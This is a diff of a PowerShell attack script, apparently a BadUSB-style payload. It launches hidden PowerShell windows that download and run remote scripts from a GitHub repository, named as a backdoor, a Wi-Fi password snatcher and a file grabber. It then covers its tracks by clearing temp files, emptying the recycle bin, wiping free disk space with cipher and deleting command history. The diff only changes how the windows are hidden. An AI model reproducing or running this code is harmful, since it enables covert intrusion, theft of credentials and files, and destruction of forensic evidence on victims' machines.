@@ -1,20 +1,11 @@
 rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
 
-start powershell -argumentlist '-windowstyle hidden $backdoor = iwr https://github.com/skekic16/lol/raw/main/BPC.ps1?dl=1; invoke-expression $backdoor'
+cmd -Argument '/c start /min "" powershell -windowstyle hidden $backdoor = iwr https://github.com/skekic16/lol/raw/main/BPC.ps1?dl=1; invoke-expression $backdoor'
 start-sleep 5
-start powershell -argumentlist '-windowstyle hidden $px = iwr https://github.com/skekic16/lol/raw/main/DP.ps1?dl=1; invoke-expression $px'
-start powershell -argumentlist '-windowstyle hidden $pw = iwr https://github.com/skekic16/lol/raw/main/files.ps1?dl=1; invoke-expression $pw'
-start powershell -argumentlist '-windowstyle hidden $pg = iwr https://github.com/skekic16/lol/raw/main/WIFI-SNATCH.ps1?dl=1; invoke-expression $pg'
-start powershell -argumentlist '-windowstyle hidden $task2 = iwr https://github.com/skekic16/lol/raw/main/task2.ps1?dl=1; invoke-expression $task2'
-
-
-
-
-
-
-
-
-
+cmd -Argument '/c start /min "" powershell -windowstyle hidden $px = iwr https://github.com/skekic16/lol/raw/main/DP.ps1?dl=1; invoke-expression $px'
+cmd -Argument '/c start /min "" powershell -windowstyle hidden $pw = iwr https://github.com/skekic16/lol/raw/main/files.ps1?dl=1; invoke-expression $pw'
+cmd -Argument '/c start /min "" powershell -windowstyle hidden $pg = iwr https://github.com/skekic16/lol/raw/main/WIFI-SNATCH.ps1?dl=1; invoke-expression $pg'
+cmd -Argument '/c start /min "" powershell -windowstyle hidden $task2 = iwr https://github.com/skekic16/lol/raw/main/task2.ps1?dl=1; invoke-expression $task2'
 
 start-sleep 60
 
@@ -28,7 +19,7 @@ Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
 }
 Clean-Exfil
-start powershell -argumentlist '-windowstyle hidden cipher /w:c'
+cmd -Argument '/c start /min "" powershell -windowstyle hidden cipher /w:c'
 Remove-Item (Get-PSreadlineOption).HistorySavePath
 cls
 exit
